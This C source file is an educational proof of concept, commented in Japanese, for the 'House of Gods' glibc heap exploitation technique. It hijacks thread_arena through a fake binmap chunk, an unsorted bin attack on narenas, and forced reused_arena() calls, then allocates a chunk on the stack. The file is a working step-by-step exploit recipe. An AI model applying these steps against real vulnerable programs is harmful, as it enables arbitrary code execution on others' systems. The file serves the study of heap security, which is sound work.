/* House of Gods PoC */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <inttypes.h>

/*
 * House of Gods へようこそ...
 *
 * House of Gods は、glibc < 2.27 に対するarena乗っ取りの手法です。
 * メインスレッドの thread_arena シンボルに対する任意の書き込みを
 * 攻撃者に与えます。これを使うと、main_arena を巧妙に作り込んだ偽のarenaに
 * 置き換えることができます。このエクスプロイトは次のバージョンに対してテストされています。
 *
 *     - glibc-2.23
 *     - glibc-2.24
 *     - glibc-2.25
 *     - glibc-2.26
 *
 * 次の要件が必須です。
 *
 *     - arenaを乗っ取るための、任意サイズの8回の割り当て(任意コード実行(ACE)にはさらに2回)
 *     - チャンクのユーザーデータの先頭5クワッドワード(quadword)の制御
 *     - unsorted チャンクに対する write-after-free バグ1つ
 *     - ヒープアドレスのリーク + libc アドレスのリーク
 *
 * この PoC は、thread_arena を乗っ取るために House of Gods をどう活用するかを
 * 示します。ただし、arena全体を制御下に置いた後は、任意コード実行への
 * 発展は簡単なので、その先については説明しません。
 *
 * また、how2heap の PoC は、先に述べた回数より多くの割り当てを使うことがあります。
 * これは意図的なもので、学習のためです。
 *
 * この手法の完全な技術的説明を、ゼロから任意コード実行まで
 * わずか10〜11回の割り当てで到達する手順を含めて読みたい場合は、
 * 私が書いた元の文書があります。
 *
 *     https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT
 *
 * how2heap の PoC を試しながら、この文書を読むことをおすすめします。
 *
 * このほか、この手法は glibc の小さなバグを悪用しており、
 * そのバグはすでに bugzilla に報告済みです。
 *
 *     https://sourceware.org/bugzilla/show_bug.cgi?id=29709
 *
 * AUTHOR: David Milosevic (milo)
 *
 * */

/* <--- Exploit PoC ---> */

int main(void) {

    printf("=================\n");
    printf("= House of Gods =\n");
    printf("=================\n\n");

    printf("=== 概要 ===\n\n");

    printf("この手法の核心は、main_arena 内の binmap フィールドに重なる\n");
    printf("偽のチャンク(fakechunk)を割り当てることです。この偽のチャンクは\n");
    printf("オフセット 0x850 にあります。そのサイズフィールドは、チャンクを\n");
    printf("small bin や largebin に慎重に入れることで作り込めます。その後、binmap チャンクを\n");
    printf("write-after-free バグで unsorted bin にリンクし、\n");
    printf("ぴったり合うサイズ(exact fit)として割り当て直します。これで、オフセット 0x868 にある\n");
    printf("main_arena.next ポインタを書き換えて、偽のarenaのアドレスを差し込めるようになります。\n");
    printf("最後の unsorted bin 攻撃で、narenas 変数を非常に大きな値に破壊します。そこから先は、\n");
    printf("少なくとも 0xffffffffffffffc0 バイトのメモリを要求する割り当てをあと2回行うだけで、\n");
    printf("reused_arena() 関数の連続した2回の呼び出しが引き起こされます。\n");
    printf("この関数は、破壊されたarenaのリストをたどり、thread_arena を\n");
    printf("main_arena.next に格納されたアドレス、つまり偽のarenaのアドレスに設定します。\n\n");

    printf("=== PoC ===\n\n");

    printf("では、いくつかチャンクを割り当てるところから始めましょう...\n\n");

    /*
     * スモールチャンク(smallchunk)を割り当てます。例えば 0x90 のチャンクです。
     * */
    void *SMALLCHUNK = malloc(0x88);

    /*
     * 最初のファストチャンク(fastchunk)を割り当てます。
     * この目的には 0x20 のチャンクを使います。
     * */
    void *FAST20 = malloc(0x18);

    /*
     * 2つ目のファストチャンクを割り当てます。今度は
     * 0x40 のチャンクです。
     * */
    void *FAST40 = malloc(0x38);

    printf("%p は 0x90 サイズのスモールチャンクです。このチャンクを bin に入れて、binmap チャンク用の\n", SMALLCHUNK);
    printf("偽のサイズフィールドを作ります。\n\n");

    printf("%p は最初のファストチャンクです。サイズは 0x20 です。\n\n", FAST20);

    printf("%p は2つ目のファストチャンクで、サイズは 0x40 です。2つのファストチャンクの\n", FAST40);
    printf("用途は、この PoC の後ほどで説明します。\n\n");

    printf("スモールチャンクを unsorted bin に移すには、単に free するだけです...\n\n");

    /*
     * SMALLCHUNK を unsorted bin に入れます。
     * */
    free(SMALLCHUNK);

    /*
     * これは libc リークを模擬する絶好の機会です。
     * unsorted bin のアドレスを読み取って、
     * 後のために保存しておきます。
     * */
    const uint64_t leak = *((uint64_t*) SMALLCHUNK);

    printf("次に、今 free したスモールチャンクでは満たせないチャンクを要求する必要があります。\n");
    printf("そこで、0xa0 サイズのチャンクを要求します。\n");
    printf("このチャンクを INTM(intermediate、中間)と呼ぶことにします。\n\n");

    /*
     * 次の割り当てで、unsorted bin 内の振り分け処理(binning)が
     * 発生し、SMALLCHUNK が 0x90 の small bin に
     * 移ります。
     * */
    void *INTM = malloc(0x98);

    printf("スモールチャンクは、これで 0x90 の small bin に入っているはずです。この処理により、\n");
    printf("malloc のソースコード内の mark_bin(m, i) マクロも実行されました。\n");
    printf("オフセット 0x855 にある main_arena の binmap を調べると、binmap の初期値が\n");
    printf("0x0 から 0x200 に変わっていることが分かります。この値は、unsorted bin のチェックを\n");
    printf("回避する有効なサイズフィールドとして使えます。\n\n");

    printf("unsorted bin の部分的なアンリンク(partial unlinking)処理を回避するには、\n");
    printf("有効な bk ポインタも必要です。幸い、オフセット 0x868 にある main_arena.next ポインタは、\n");
    printf("初期状態では main_arena 自身の先頭を指しています。この事実により、\n");
    printf("segfault を起こさずに partial unlinking を通過できます。\n\n");

    printf("これで binmap チャンクが作り込めたので、unsorted bin から\n");
    printf("割り当てる番です。そのために、unsorted チャンクに対する\n");
    printf("write-after-free バグを悪用します。始めましょう...\n\n");

    printf("まず、もう1つスモールチャンクを割り当てます...\n");

    /*
     * 先ほど bin に入れたスモールチャンクを再利用します。
     * このチャンクを再利用する必要は必ずしもありません。
     * ヒープのレイアウトを小さくコンパクトに保つために
     * そうしているだけです。
     * */
    SMALLCHUNK = malloc(0x88);

    printf("...そして、この新しいチャンクを unsorted bin に移します...\n");

    /*
     * SMALLCHUNK を unsorted bin に入れます。
     * */
    free(SMALLCHUNK);

    printf("...解放されたチャンクの bk ポインタを書き換えるためです。\n\n");

    /*
     * バグ: unsorted チャンクに対する write-after-free バグ1つで、
     * House of Gods 手法を始めるのに十分です。
     * */
    *((uint64_t*) (SMALLCHUNK + 0x8)) = leak + 0x7f8;

    printf("できました。unsorted bin を binmap チャンクに向け直しました。\n");
    printf("しかし、bin も壊してしまいました。これを直すために、\n");
    printf("もう一度リダイレクトします。\n\n");

    printf("unsorted bin の次のチャンク(head->bk->bk->bk)は、main-arena の\n");
    printf("先頭にあります。この事実を悪用して、0x20 のチャンクと 0x40 のチャンクを free し、\n");
    printf("有効なサイズフィールドと bk ポインタを作ります。また、0x40 のチャンクは、\n");
    printf("実際に free する前にその bk ポインタへ書き込んでおくことで、\n");
    printf("別の割り当て済みチャンク(INTM)を指すようにします。\n\n");

    /*
     * これらのチャンクを free する前に、現在使われていない
     * FAST40 の bk ポインタに、別のチャンクのアドレスを書き込みます。
     * そのために、先ほど要求した INTM チャンクを再利用できます。
     *
     * FAST40 を free しても bk ポインタはリセットされません。したがって、
     * fastbin の1つに格納したまま、割り当て済みのチャンクを
     * 指させることができます。
     *
     * その理由は単純で、後で unsorted bin 攻撃を
     * 行う必要があるからです。
     * そして、partial unlinking を引き起こすために 0x40 のチャンクを要求することはできません。
     * 0x40 の要求は unsorted bin ではなく fastbin から
     * 満たされてしまうためです。
     * */
    *((uint64_t*) (FAST40 + 0x8)) = (uint64_t) (INTM - 0x10);

    /*
     * 次に、サイズフィールドを作るために 0x20 のチャンクを free します。
     * */
    free(FAST20);

    /*
     * そして、bk ポインタを作るために 0x40 のチャンクを free します。
     * */
    free(FAST40);

    printf("これで、unsorted bin は次のようになっているはずです。\n\n");

    printf("head -> SMALLCHUNK -> binmap -> main-arena -> FAST40 -> INTM\n");
    printf("     bk            bk        bk            bk        bk\n\n");

    printf("binmap 攻撃はほぼ完了です。残る作業は、binmap チャンクの\n");
    printf("サイズフィールドに一致するサイズを要求することだけです。\n\n");

    /*
     * 苦労がようやく報われます...unsorted bin から
     * binmap チャンクを割り当てられるようになりました。
     * */
    void *BINMAP = malloc(0x1f8);

    printf("binmap チャンクを割り当てた後、unsorted bin は次のようになっているはずです。\n\n");

    printf("head -> main-arena -> FAST40 -> INTM\n");
    printf("     bk            bk        bk\n\n");

    printf("これが binmap 攻撃です。main-arena 内のごく一部のフィールドの制御を\n");
    printf("奪うことに成功しました。そのうち2つは、\n");
    printf("House of Gods 手法にとって重要です。\n\n");

    printf("    -> main_arena.next\n");
    printf("    -> main_arena.system_mem\n\n");

    printf("main_arena.next フィールドを書き換えると、arenaの連結リストを\n");
    printf("操作して、偽のarenaのアドレスを挿入できます。これができたら、\n");
    printf("malloc の reused_arena() 関数を2回呼び出させることができます。\n\n");

    printf("reused_arena() 関数の目的は、現在のarenaが前回の割り当て要求を\n");
    printf("処理できなかった場合に、arenaの連結リストから、破壊されておらず\n");
    printf("ロックもされていないarenaを返すことです。\n\n");

    printf("reused_arena() の最初の呼び出しは、連結リストをたどって、\n");
    printf("現在の main-arena へのポインタを返します。\n\n");

    printf("reused_arena() の2回目の呼び出しは、連結リストをたどって、\n");
    printf("先ほど差し込んだ偽のarena(main_arena.next)へのポインタを返します。\n\n");

    printf("次の条件を満たせば、reused_arena() に到達できます。\n\n");

    printf("    - プロセスが持てるarenaの総数を超えること。\n");
    printf("      malloc は narenas 変数をarenaのカウンタとして使って\n");
    printf("      数を管理しています。このカウンタが上限(narenas_limit)を超えると、\n");
    printf("      新しいarenaを作る代わりに、arenaのリストから既存のarenaを\n");
    printf("      再利用し始めます。幸い、narenas に対して unsorted bin 攻撃を行えば、\n");
    printf("      非常に大きな値に設定できます。\n\n");

    printf("    - malloc のアルゴリズムに、現在のarenaを諦めさせること。\n");
    printf("      malloc は失敗に気づくと、別のarenaで2回目の割り当てを\n");
    printf("      試みます。0xffffffffffffffc0 以上のような、多すぎるメモリを\n");
    printf("      要求するだけで、割り当ての失敗を模倣できます。\n\n");

    printf("まず unsorted bin 攻撃から始めましょう。narenas のアドレスから\n");
    printf("0x10 を引いた値を、現在割り当て済みの INTM チャンクの bk ポインタに入れます...\n\n");

    /*
     * INTM の bk を narenas-0x10 に設定します。これが
     * unsorted bin 攻撃の標的になります。
     * */
    *((uint64_t*) (INTM + 0x8)) = leak - 0xa20;

    printf("...そして、main_arena.system_mem フィールドを書き換えて、main-arena に重なるチャンクの\n");
    printf("サイズの健全性チェックを通過させます。\n\n");

    /*
     * こうすることで、ヒープポインタを
     * 有効なサイズフィールドとして悪用できます。
     * */
    *((uint64_t*) (BINMAP + 0x20)) = 0xffffffffffffffff;

    printf("unsorted bin は、これで次のようになっているはずです。\n\n");

    printf("head -> main-arena -> FAST40 -> INTM -> narenas-0x10\n");
    printf("     bk            bk        bk      bk\n\n");

    printf("INTM チャンクをぴったり合うサイズ(exact fit)で要求すれば、\n");
    printf("unsorted bin 攻撃を発動できます。\n\n");

    /*
     * unsorted bin から INTM チャンクを要求して、
     * head と narenas-0x10 の間の partial unlinking を
     * 引き起こします。
     * */
    INTM = malloc(0x98);

    printf("完璧です。narenas は、unsorted bin の head のアドレスに設定されました。\n");
    printf("これは、既存のarenaの上限を超えるのに十分な大きさのはずです。\n\n");

    printf("次に、先ほど割り当てた binmap チャンク内の main_arena.next ポインタを\n");
    printf("書き換えます。このフィールドに書き込むアドレスが、\n");
    printf("将来の thread_arena の値になります。\n\n");

    /*
     * main_arena.next を任意のアドレスに設定します。次の
     * 2回の malloc 呼び出しで、thread_arena が
     * 同じアドレスで上書きされます。ここでは INTM を偽のarenaとして再利用します。
     *
     * INTM は偽のarenaとしては適していませんが、
     * それでも、thread_arena を任意のアドレスに設定できることを
     * 示す簡単な方法です。
     * */
    *((uint64_t*) (BINMAP + 0x8)) = (uint64_t) (INTM - 0x10);

    printf("完了です。あとは、不正なチャンクサイズで2回要求して、reused_arena() 関数を\n");
    printf("2回呼び出させるだけです。\n\n");

    /*
     * 最初の呼び出しで、reused_arena() 関数は
     * thread_arena を現在の main-arena のアドレスに
     * 設定します。
     * */
    malloc(0xffffffffffffffbf + 1);

    /*
     * 2回目の呼び出しで、reused_arena() 関数は
     * thread_arena を main_arena.next に格納されたアドレス、
     * つまり偽のarenaのアドレスに設定します。
     * */
    malloc(0xffffffffffffffbf + 1);

    printf("成功しました。thread_arena シンボルを乗っ取り、これ以降のメモリ要求は\n");
    printf("偽のarenaによって処理されます。確認してみましょう。\n");
    printf("新しい偽のarenaの fastbin の1つから、スタック上の偽のチャンクを\n");
    printf("割り当ててみます。\n\n");

    /*
     * スタック上に 0x70 の偽のチャンクを作ります...
     * */
    uint64_t fakechunk[4] = {

        0x0000000000000000, 0x0000000000000073,
        0x4141414141414141, 0x0000000000000000
    };

    /*
     * ...そして、それを偽のarenaの 0x70 の fastbin に置きます。
     * */
    *((uint64_t*) (INTM + 0x20)) = (uint64_t) (fakechunk);

    printf("偽のチャンクは、スタックアドレス %p に配置されています。\n", fakechunk);
    printf("偽のチャンク内の標的データのアドレスは %p です。\n", &fakechunk[2]);
    printf("現在の値は %#lx です。\n\n", fakechunk[2]);

    printf("そして、0x70 のチャンクを要求すると...\n");

    /*
     * 偽のarenaを使って、任意の割り当てを行います。
     * */
    void *FAKECHUNK = malloc(0x68);

    printf("...malloc は、%p にある偽のチャンクを返してきます。\n\n", FAKECHUNK);

    printf("新しく割り当てられたチャンクを上書きすると、標的データも\n");
    printf("変わります: ");

    /*
     * 標的データを上書きします。
     * */
    *((uint64_t*) (FAKECHUNK)) = 0x4242424242424242;

    printf("%#lx\n", fakechunk[2]);

    /*
     * 成功を確認します。
     * */
    assert(fakechunk[2] == 0x4242424242424242);

    return EXIT_SUCCESS;
}
